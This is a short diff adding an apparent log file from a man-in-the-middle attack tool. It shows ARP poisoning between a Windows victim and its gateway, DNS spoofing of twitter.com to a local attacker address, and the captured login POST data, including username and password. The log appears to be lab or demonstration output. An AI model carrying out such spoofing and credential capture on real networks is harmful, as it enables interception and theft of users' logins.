@@ -1,0 +1,6 @@
+2019-10-25 11:21:56 127.0.0.1 [DNS] Cooking the response of type 'A' for twitter.com to 192.168.2.12
+2019-10-25 11:21:56 192.168.2.7 [type:IE-8 os:Windows] twitter.com
+2019-10-25 11:21:56 192.168.2.7 [type:IE-8 os:Windows] twitter.com
+2019-10-25 11:22:02 192.168.2.7 [type:IE-8 os:Windows] POST Data (192.168.2.12):
+session%5Busername_or_email%5D=admin&session%5Bpassword%5D=mystrongpassword&authenticity_token=dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52&scribe_log=&redirect_after_login=&authenticity_token=dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52
+2019-10-25 11:22:43 [ARPpoisoner] Restoring connection 192.168.2.7 <-> 192.168.2.254 with 2 packets per host
